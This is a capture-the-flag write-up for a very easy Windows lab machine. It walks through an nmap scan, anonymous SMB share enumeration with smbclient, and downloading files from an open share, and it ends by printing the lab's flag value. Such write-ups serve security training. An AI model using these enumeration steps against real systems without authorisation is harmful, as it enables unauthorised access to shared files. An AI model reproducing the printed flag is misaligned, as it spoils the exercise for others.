System: Windows
Difficulty: Very Easy

IP Address: 10.129.100.162

# System Flag

NMAP Enumeration is performed on the target.
```
kali@kali:~$ sudo nmap 10.129.100.162 -sC -sV
```

Those are the ports returned from the system.
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Normal Enumeration of the SMB Service is performed.
```
smbclient -L 10.129.100.162
```

4 Shares has been returned from the command.
```
<SNIP>
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk
<SNIP>
```

The anormal `WorkShares` share is examined.
```
kali@kali:~$ smbclient //10.129.100.162/WorkShares
```

The contents of the shares can be listed and examined.
```
smb: \> dir
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

		5114111 blocks of size 4096. 1753617 blocks available
smb: \> cd Amy.J
smb: \Amy.J\> dir
  .                                   D        0  Mon Mar 29 05:08:24 2021
  ..                                  D        0  Mon Mar 29 05:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

		5114111 blocks of size 4096. 1753617 blocks available
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```

The file `worknotes.txt` has been downloaded on the system.
The flag file has been obtained too.
```
smb: \> dir
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

		5114111 blocks of size 4096. 1753617 blocks available
smb: \> cd James
cd \James\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> cd James.P
smb: \James.P\> dir
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

		5114111 blocks of size 4096. 1753617 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

The contents of the first file does not lead to anything further.
```
kali@kali:~$ cat worknotes.txt
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing
```

The contents of the flag as below.
```
kali@kali:~$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664 
```